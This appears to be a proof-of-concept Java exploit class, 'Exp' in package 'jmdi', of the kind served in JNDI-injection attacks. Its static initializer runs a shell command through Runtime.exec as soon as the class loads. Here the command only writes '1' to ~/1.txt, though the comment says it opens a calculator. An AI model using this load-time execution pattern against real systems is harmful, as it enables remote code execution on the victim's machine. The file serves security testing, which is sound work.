package jmdi;

import java.io.*;

public class Exp{
    static {
        try {
            //调用计算器
            Runtime.getRuntime().exec("echo \"1\" > ~/1.txt");
        }
        catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}